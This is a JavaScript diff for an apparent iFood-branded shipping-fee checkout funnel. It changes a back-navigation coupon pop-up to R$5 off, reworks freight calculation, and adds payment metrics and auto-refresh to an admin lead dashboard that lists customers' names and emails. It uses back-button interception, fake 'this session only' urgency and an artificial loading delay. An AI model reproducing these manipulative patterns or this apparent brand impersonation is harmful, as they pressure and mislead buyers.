@@ -186,23 +186,22 @@ function setupGlobalBackRedirect(page) {
     const modalEls = ensureCouponModalElements();
     const modal = modalEls.modal;
     const btnApply = modalEls.btnApply;
-    const priceOld = modalEls.priceOld;
-    const priceNew = modalEls.priceNew;
-
-    const shipping = loadShipping();
-    const basePrice = Number(shipping?.originalPrice || shipping?.price || 25.9);
-    const discount = 0.2;
-    const discounted = roundMoney(basePrice * (1 - discount));
-    if (priceOld) priceOld.textContent = formatCurrency(basePrice);
-    if (priceNew) priceNew.textContent = formatCurrency(discounted);
+    const couponMessage = modalEls.couponMessage;
+    if (couponMessage) {
+        couponMessage.textContent = 'Você ganhou R$ 5,00 de desconto no frete da Bag.';
+    }
 
     const showCouponModal = () => {
         modal.classList.remove('hidden');
         modal.setAttribute('aria-hidden', 'false');
+        modal.classList.remove('coupon-anim-in');
+        void modal.offsetWidth;
+        modal.classList.add('coupon-anim-in');
         trackLead('coupon_offer_shown', { stage: page });
     };
 
     const hideCouponModal = () => {
+        modal.classList.remove('coupon-anim-in');
         modal.classList.add('hidden');
         modal.setAttribute('aria-hidden', 'true');
     };
@@ -274,7 +273,7 @@ function setupGlobalBackRedirect(page) {
 
     if (btnApply) {
         btnApply.addEventListener('click', () => {
-            saveCoupon({ code: 'FRETE20', discount: 0.2, appliedAt: Date.now() });
+            saveCoupon({ code: 'FRETE5', amountOff: 5, appliedAt: Date.now() });
             sessionStorage.setItem(STORAGE_KEYS.directCheckout, '1');
             hideCouponModal();
             trackLead('coupon_offer_accept', { stage: page });
@@ -291,13 +290,12 @@ function ensureCouponModalElements() {
         wrapper.innerHTML = `
             <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
                 <div class="modal-card">
+                    <div class="coupon-hero">
+                        <img src="/assets/bagfoto.webp" alt="Bag iFood com desconto">
+                    </div>
                     <span class="modal-badge">Cupom exclusivo</span>
                     <h3 id="coupon-title">Desconto liberado no frete</h3>
-                    <p>Você ganhou 20% OFF no frete da Bag. Aproveite agora para pagar mais barato.</p>
-                    <div class="coupon-prices">
-                        <span id="coupon-old" class="price-old">R$ 25,90</span>
-                        <span id="coupon-new" class="price-new">R$ 20,72</span>
-                    </div>
+                    <p id="coupon-message">Você ganhou R$ 5,00 de desconto no frete da Bag.</p>
                     <span class="coupon-subtitle">Oferta válida agora nesta sessão</span>
                     <button id="btn-coupon-apply" class="btn-primary" type="button">Usar cupom e pagar mais barato</button>
                 </div>
@@ -310,8 +308,7 @@ function ensureCouponModalElements() {
     return {
         modal,
         btnApply: document.getElementById('btn-coupon-apply'),
-        priceOld: document.getElementById('coupon-old'),
-        priceNew: document.getElementById('coupon-new')
+        couponMessage: document.getElementById('coupon-message')
     };
 }
 
@@ -872,13 +869,15 @@ function initCheckout() {
     const couponBanner = document.getElementById('coupon-banner');
     const btnEditData = document.querySelector('.action-stack a[href^="dados"]');
     const btnEditAddress = document.querySelector('.action-stack a[href^="endereco"]');
+    if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
 
     const coupon = loadCoupon();
-    if (couponBanner && coupon?.discount) {
+    if (couponBanner && (coupon?.amountOff || coupon?.discount)) {
+        const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
         couponBanner.classList.remove('hidden');
         couponBanner.innerHTML = `
-            <strong>Cupom aplicado:</strong> ${coupon.code || 'FRETE20'}
-            <span>${Math.round(coupon.discount * 100)}% OFF no frete da Bag</span>
+            <strong>Cupom aplicado:</strong> ${coupon.code || 'FRETE5'}
+            <span>R$ ${amountOff.toFixed(2).replace('.', ',')} de desconto no frete da Bag</span>
         `;
     }
 
@@ -922,6 +921,28 @@ function initCheckout() {
     }
 
     let cepLookupTimer = null;
+    const getCepDigits = (value) => String(value || '').replace(/\D/g, '');
+    const hasResolvedAddressForCep = (rawCep) => {
+        const savedCep = getCepDigits(address?.cep || '');
+        const hasStreet = !!String(address?.street || address?.streetLine || '').trim();
+        const hasCity = !!String(address?.city || address?.cityLine || '').trim();
+        return rawCep && savedCep === rawCep && hasStreet && hasCity;
+    };
+
+    const openFreightOptions = (rawCep, shouldTrack = true) => {
+        const options = buildShippingOptions(rawCep);
+        cachedOptions = options;
+        if (!cachedSelectedId || !options.some((opt) => opt.id === cachedSelectedId)) {
+            cachedSelectedId = 'padrao';
+        }
+        showFreightSelection();
+        const selected = options.find((opt) => opt.id === cachedSelectedId) || options.find((opt) => opt.id === 'padrao') || options[0];
+        if (selected) selectShipping(selected, options);
+        if (shouldTrack) {
+            trackLead('frete_options_shown', { stage: 'checkout' });
+        }
+    };
+
     const handleCepAutoLookup = () => {
         const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
         if (rawCep.length !== 8) return;
@@ -957,6 +978,9 @@ function initCheckout() {
                 address = updatedAddress;
                 updateSummaryAddress();
                 updateFreightAddress(updatedAddress);
+                if (!shipping) {
+                    openFreightOptions(rawCep, false);
+                }
             })
             .catch(() => {
                 showToast('CEP não encontrado. Verifique e tente novamente.', 'error');
@@ -1124,6 +1148,29 @@ function initCheckout() {
             return;
         }
 
+        const finishCalc = () => {
+            setHidden(freightLoading, true);
+            if (btnCalcFreight) {
+                btnCalcFreight.disabled = false;
+            }
+            setHidden(summaryBlock, false);
+            setHidden(freightForm, false);
+            setHidden(freightAddress, false);
+            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
+            if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
+            openFreightOptions(rawCep, true);
+        };
+
+        if (hasResolvedAddressForCep(rawCep)) {
+            if (summaryCep) summaryCep.textContent = formatCep(rawCep);
+            updateSummaryAddress();
+            updateFreightAddress(address);
+            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
+            if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
+            finishCalc();
+            return;
+        }
+
         if (btnCalcFreight) {
             btnCalcFreight.classList.add('hidden');
         }
@@ -1178,25 +1225,16 @@ function initCheckout() {
                 updateFreightAddress(updatedAddress);
                 trackLead('frete_calculated', { stage: 'checkout', address: updatedAddress });
                 setHidden(freightDetails, false);
-                setHidden(summaryBlock, true);
+                setHidden(summaryBlock, false);
                 if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
                 setHidden(freightForm, false);
                 hydrateExtraAddress();
                 bindExtraAddress();
 
-                const options = buildShippingOptions(rawCep);
-                cachedOptions = options;
-                cachedSelectedId = 'padrao';
-                if (freightOptions) freightOptions.innerHTML = '';
-
                 const elapsed = Date.now() - startTime;
                 const remaining = Math.max(0, minDelay - elapsed);
                 setTimeout(() => {
-                    setHidden(freightLoading, true);
-                    setHidden(freightLoading, true);
-                    if (btnCalcFreight) {
-                        btnCalcFreight.disabled = false;
-                    }
+                    finishCalc();
                 }, remaining);
             })
             .catch(() => {
@@ -1216,14 +1254,13 @@ function initCheckout() {
     btnCalcFreight?.addEventListener('click', calcShipping);
 
     btnVerifyFreight?.addEventListener('click', () => {
-        setHidden(freightForm, true);
-        setHidden(summaryBlock, false);
-        showFreightSelection();
-        trackLead('frete_options_shown', { stage: 'checkout' });
-        if (cachedOptions) {
-            const defaultOpt = cachedOptions.find((opt) => opt.id === 'padrao');
-            if (defaultOpt) selectShipping(defaultOpt, cachedOptions);
+        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
+        if (rawCep.length !== 8) {
+            showToast('Digite um CEP válido para continuar.', 'error');
+            return;
         }
+        openFreightOptions(rawCep, true);
+        if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
     });
 
     if (shipping && freightOptions) {
@@ -1248,6 +1285,16 @@ function initCheckout() {
     if (!shipping) {
         hydrateExtraAddress();
         bindExtraAddress();
+        const savedCepDigits = getCepDigits(address?.cep || '');
+        if (savedCepDigits.length === 8 && hasResolvedAddressForCep(savedCepDigits)) {
+            if (checkoutCep) checkoutCep.value = formatCep(savedCepDigits);
+            updateFreightAddress(address);
+            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
+            if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
+            setHidden(summaryBlock, false);
+            setHidden(freightForm, false);
+            openFreightOptions(savedCepDigits, false);
+        }
     }
 
     const syncShippingAfterAddressEdit = () => {
@@ -1604,6 +1651,7 @@ function initAdmin() {
         pix: 0,
         frete: 0,
         cep: 0,
+        paid: 0,
         lastUpdated: ''
     };
     let currentSettings = null;
@@ -1853,8 +1901,9 @@ function initAdmin() {
 
         rows.forEach((row) => {
             const tr = document.createElement('tr');
-            const isPaid = String(row.evento || '') === 'pix_confirmed';
-            const statusLabel = isPaid ? 'pagamento_confirmado' : (row.status_funil || '-');
+            const ev = String(row.evento || '').toLowerCase().trim();
+            const isPaid = ev === 'pix_confirmed' || ev === 'pagamento_confirmado' || ev === 'paid';
+            const statusLabel = isPaid ? 'pagamento_confirmado' : (row.status_funil || row.evento || '-');
             tr.innerHTML = `
                 <td>${row.nome || '-'}</td>
                 <td>${row.email || '-'}</td>
@@ -1872,12 +1921,21 @@ function initAdmin() {
         if (leadsCount) leadsCount.textContent = String(offset + rows.length);
     };
 
-    const updateMetrics = (rows, reset = false) => {
+    const updateMetrics = (rows, reset = false, summary = null) => {
+        if (summary && typeof summary === 'object') {
+            metrics.total = Number(summary.total || 0);
+            metrics.pix = Number(summary.pix || 0);
+            metrics.frete = Number(summary.frete || 0);
+            metrics.cep = Number(summary.cep || 0);
+            metrics.paid = Number(summary.paid || 0);
+            metrics.lastUpdated = String(summary.lastUpdated || '');
+        } else {
         if (reset) {
             metrics.total = 0;
             metrics.pix = 0;
             metrics.frete = 0;
             metrics.cep = 0;
+            metrics.paid = 0;
             metrics.lastUpdated = '';
         }
 
@@ -1886,15 +1944,18 @@ function initAdmin() {
             const cep = String(row.cep || '').trim();
             const frete = String(row.frete || '').trim();
             const pixTxid = String(row.pix_txid || '').trim();
+            const ev = String(row.evento || '').toLowerCase().trim();
 
             if (pixTxid && pixTxid !== '-') metrics.pix += 1;
             if (frete && frete !== '-') metrics.frete += 1;
             if (cep && cep !== '-') metrics.cep += 1;
+            if (ev === 'pix_confirmed' || ev === 'pagamento_confirmado' || ev === 'paid') metrics.paid += 1;
             if (!metrics.lastUpdated && row.updated_at) metrics.lastUpdated = row.updated_at;
         });
+        }
 
         if (metricTotal) metricTotal.textContent = String(metrics.total);
-        if (metricPix) metricPix.textContent = String(metrics.pix);
+        if (metricPix) metricPix.textContent = String(metrics.paid || metrics.pix);
         if (metricFrete) metricFrete.textContent = String(metrics.frete);
         if (metricCep) metricCep.textContent = String(metrics.cep);
         if (metricUpdated) {
@@ -1905,7 +1966,7 @@ function initAdmin() {
         if (metricBase) metricBase.textContent = `Base: ${metrics.total}`;
 
         const total = metrics.total || 0;
-        const pctPix = total ? Math.round((metrics.pix / total) * 100) : 0;
+        const pctPix = total ? Math.round((((metrics.paid || 0) || metrics.pix) / total) * 100) : 0;
         const pctFrete = total ? Math.round((metrics.frete / total) * 100) : 0;
         const pctCep = total ? Math.round((metrics.cep / total) * 100) : 0;
 
@@ -1930,13 +1991,14 @@ function initAdmin() {
         url.searchParams.set('limit', String(limit));
         url.searchParams.set('offset', String(offset));
         if (query) url.searchParams.set('q', query);
+        if (metricTotal) url.searchParams.set('summary', '1');
 
         const res = await adminFetch(url.toString());
         if (res.ok) {
             const data = await res.json();
             const rows = data.data || [];
             renderLeads(rows, !reset);
-            updateMetrics(rows, reset);
+            updateMetrics(rows, reset, data.summary || null);
             offset += rows.length;
         }
         loadingLeads = false;
@@ -2082,6 +2144,12 @@ function initAdmin() {
             if (hasPixelForm || hasUtmfyForm) loadSettings();
             if (wantsLeads) loadLeads({ reset: true });
             if (wantsPages) loadPageCounts();
+            // Keep overview fresh without manual reload.
+            setInterval(() => {
+                if (document.visibilityState !== 'visible') return;
+                if (wantsLeads) loadLeads({ reset: true });
+                if (wantsPages) loadPageCounts();
+            }, 30000);
         } else {
             setLoginVisible(true);
         }
@@ -2319,7 +2387,7 @@ function clearCoupon() {
 
 function buildShippingOptions(rawCep) {
     const coupon = loadCoupon();
-    const discount = coupon?.discount ? Number(coupon.discount) : 0;
+    const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
     const baseOptions = [
         {
             id: 'economico',
@@ -2343,12 +2411,12 @@ function buildShippingOptions(rawCep) {
 
     return baseOptions.map((opt) => {
         const original = Number(opt.price || 0);
-        const discounted = discount ? roundMoney(original * (1 - discount)) : original;
+        const discounted = amountOff ? Math.max(0, roundMoney(original - amountOff)) : original;
         return {
             ...opt,
-            originalPrice: discount ? original : null,
+            originalPrice: amountOff ? original : null,
             price: discounted,
-            discountApplied: discount > 0
+            discountApplied: amountOff > 0
         };
     });
 }
@@ -2369,16 +2437,18 @@ function loadShipping() {
 function applyCouponToShipping(shipping) {
     if (!shipping) return shipping;
     const coupon = loadCoupon();
-    if (!coupon?.discount) return shipping;
+    const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
+    if (!amountOff) return shipping;
     const base = Number(shipping.originalPrice || shipping.basePrice || shipping.price || 0);
-    const discounted = roundMoney(base * (1 - coupon.discount));
+    const discounted = Math.max(0, roundMoney(base - amountOff));
     if (discounted === shipping.price && shipping.coupon === coupon.code) return shipping;
     const updated = {
         ...shipping,
         basePrice: base,
         originalPrice: base,
         price: discounted,
-        coupon: coupon.code || 'FRETE20',
+        coupon: coupon.code || 'FRETE5',
+        amountOff,
         discountApplied: true
     };
     saveShipping(updated);
